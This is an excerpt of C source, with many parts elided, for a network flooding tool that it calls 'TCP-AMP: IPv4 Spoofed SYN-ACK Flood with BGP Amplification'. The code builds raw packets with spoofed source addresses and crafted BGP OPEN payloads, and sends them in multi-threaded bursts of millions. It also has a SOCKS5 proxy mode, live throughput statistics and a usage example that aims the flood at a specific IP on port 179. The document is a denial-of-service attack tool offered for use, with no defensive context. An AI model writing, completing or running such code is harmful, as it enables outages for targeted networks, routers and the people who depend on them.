...
void *flooding_thread(void *par1) {
    ...
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = 0;  // Will be set in loop
    ...
    // SYN-ACK packets need both sequence and ACK sequence numbers
    ...
    while (g_running) {
        ...
        for (int burst = 0; burst < 5000000; burst++) {
            ...
            tcph->syn = 1;
            tcph->ack = 1;  // SYN-ACK: both flags set
            tcph->fin = 0;
            tcph->rst = 0;
            tcph->psh = 0;
            tcph->urg = 0;
            ...
            if (conn) {
                ...
                // Realistic sequence progression per connection for SYN-ACK packets
                // SYN-ACK packets have both sequence and ACK sequence
                uint32_t conn_id = (spoofed_ip ^ randSP) % 5;
                
                // Generate realistic sequence numbers for SYN-ACK packets
                if (conn_id == 0) {
                ...
                // ACK sequence for SYN-ACK: acknowledge the client's SYN sequence
                ack_val = base_seq + random_number_beetwhen(1000000, 100000000);
            } else {
                // FALLBACK: Generate random sequence numbers for SYN-ACK packets
                ...
                // ACK sequence: acknowledge client's SYN
                ack_val = base_seq + random_number_beetwhen(1000000, 100000000);
            }
            
            // SYN-ACK packets have both sequence and ACK sequence
            tcph->seq = htonl(seq_val);
            tcph->ack_seq = htonl(ack_val);  // SYN-ACK has ACK sequence
            ...
            // BGP Amplification: Add BGP-like payload for amplification
            int data_len = 0;
            char bgp_payload[512] = {0};
            
            if (g_use_bgp_amp) {
                // BGP OPEN message structure for amplification
                // BGP messages can be large, causing amplification
                bgp_payload[0] = 0xFF; bgp_payload[1] = 0xFF; bgp_payload[2] = 0xFF; bgp_payload[3] = 0xFF;  // Marker
                bgp_payload[4] = 0xFF; bgp_payload[5] = 0xFF; bgp_payload[6] = 0xFF; bgp_payload[7] = 0xFF;
                bgp_payload[8] = 0xFF; bgp_payload[9] = 0xFF; bgp_payload[10] = 0xFF; bgp_payload[11] = 0xFF;
                bgp_payload[12] = 0xFF; bgp_payload[13] = 0xFF; bgp_payload[14] = 0xFF; bgp_payload[15] = 0xFF;
                
                // Length (19 + options)
                bgp_payload[16] = 0x00;
                bgp_payload[17] = 0x4F;  // 79 bytes total
                ...
                // AS number (2 bytes)
                bgp_payload[20] = (random_number_beetwhen(1, 65535) >> 8) & 0xFF;
                bgp_payload[21] = random_number_beetwhen(1, 65535) & 0xFF;
                
                // Hold time (2 bytes)
                bgp_payload[22] = 0x00;
                bgp_payload[23] = 0xB4;  // 180 seconds
                
                // BGP Identifier (4 bytes)
                uint32_t bgp_id = generate_spoofed_ip((int)thread_id, iteration + burst);
                memcpy(&bgp_payload[24], &bgp_id, 4);
                
                // Optional Parameters Length (1 byte)
                bgp_payload[28] = 0x2E;  // 46 bytes of options
                
                // Optional Parameters (BGP capabilities)
                int opt_offset = 29;
                // Capability: Multiprotocol Extensions
                bgp_payload[opt_offset++] = 0x02;  // Parameter type
                bgp_payload[opt_offset++] = 0x06;  // Length
                bgp_payload[opt_offset++] = 0x01;  // Capability code
                bgp_payload[opt_offset++] = 0x04;  // Capability length
                bgp_payload[opt_offset++] = 0x00;  // AFI
                bgp_payload[opt_offset++] = 0x01;
                bgp_payload[opt_offset++] = 0x00;  // SAFI
                bgp_payload[opt_offset++] = 0x01;
                
                // Fill rest with BGP-like data
                for (int i = opt_offset; i < 79; i++) {
                    bgp_payload[i] = random_number_beetwhen(0, 255);
                }
                
                data_len = 79;
                memcpy(datagram + sizeof(struct iphdr) + tcp_hdr_len, bgp_payload, data_len);
            }
            ...
            static __thread unsigned char pseudogram_buffer[2048];  // Thread-local, larger buffer for BGP payload
            ...
            *((uint16_t *)(pseudogram + 10)) = psh.tcp_length;
            ...
            int send_result = sendto(s, datagram, total_packet_len, MSG_DONTWAIT | MSG_NOSIGNAL, (struct sockaddr *) &sin, sizeof(sin));
            ...
            if (send_result > 0) {
                ...
                if (saved_errno == EAGAIN || saved_errno == EWOULDBLOCK) {
                    ...
                    __sync_add_and_fetch(&g_total_packets_failed, 1);
                }
            }
...
void *stats_thread(void *arg) {
    ...
    while (g_running) {
        ...
        // SYN-ACK packets: ~60-140 bytes (with BGP payload can be larger)
        double packet_size = g_use_bgp_amp ? 140.0 : 60.0;
        double mbps = (pps_calc * packet_size * 8.0) / 1000000.0;
        ...
        if (g_use_proxies) {
            ...
            if (g_use_bgp_amp) {
                printf("\r\033[K[LIVE] PPS: %10lu | Sent: %12lu | Failed: %8lu | BGP-AMP: ON | Mbps: %8.2f",
...
int main(int argc, char *argv[]) {
    // Check for SOCKS5 proxy mode and BGP amplification
    g_use_proxies = 0;
    g_use_bgp_amp = 0;
    ...
    if (argc < 6) {
        fprintf(stderr, "[+] TCP-AMP: IPv4 Spoofed SYN-ACK Flood with BGP Amplification\n");
        fprintf(stdout, "[+] Usage: %s <IP> <PORT> <THREADS> <TIME> <PPS> [--socks5] [--bgp]\n", argv[0]);
        ...
        fprintf(stdout, "[+] Example (BGP Amplification): %s 185.206.148.136 179 300 60 10000000 --bgp\n", argv[0]);
    ...
    if (g_use_proxies) {
        fprintf(stdout, "[+] Starting %d threads with PROXIED RAW SOCKET SYN-ACK FLOOD\n", num_threads);
        ...
        fprintf(stdout, "[*] Attack: 100%% SYN-ACK packets with random TCP options (MSS, Window Scale, Timestamp)\n");
    } else {
        fprintf(stdout, "[+] Starting %d threads with SYN-ACK FLOOD", num_threads);
        if (g_use_bgp_amp) {
            fprintf(stdout, " + BGP AMPLIFICATION");
        }
        fprintf(stdout, "\n");
        fprintf(stdout, "[+] Target: %s:%d\n", argv[1], floodport);
        fprintf(stdout, "[+] Maximum PPS: %d\n", maxim_pps);
        ...
        fprintf(stdout, "[*] Attack: 100%% SYN-ACK packets with random TCP options (MSS, Window Scale, Timestamp)\n");
        if (g_use_bgp_amp) {
            fprintf(stdout, "[*] BGP Amplification: Enabled (targeting BGP routers for amplification)\n");
        }
    }
    ...
    for(int i = 0; i < num_threads; i++) {
        ...
        // SYN-ACK FLOOD: Always use raw socket flooding (with proxy IP spoofing if --socks5)
        // BGP amplification: If --bgp flag, target BGP routers for amplification
    ...
    if (g_use_proxies) {
        printf("\n[-] Proxied Raw Socket SYN-ACK Flood started (%d threads active).\n", threads_created);
        printf("[-] SYN-ACK packets with random TCP options (MSS, Window Scale, Timestamp)\n");
        printf("[-] Running for %d seconds - Monitor statistics above...\n", run_time);
    } else {
        printf("\n[-] SYN-ACK Flood");
        if (g_use_bgp_amp) {
            printf(" + BGP Amplification");
        }
        printf(" started (%d threads active).\n", threads_created);
        printf("[-] SYN-ACK packets with random TCP options (MSS, Window Scale, Timestamp)\n");
        if (g_use_bgp_amp) {
            printf("[-] BGP Amplification: Targeting BGP routers (port 179) for amplification\n");
        }
        printf("[-] Running for %d seconds - Monitor statistics above...\n", run_time);
    }
    fflush(stdout);
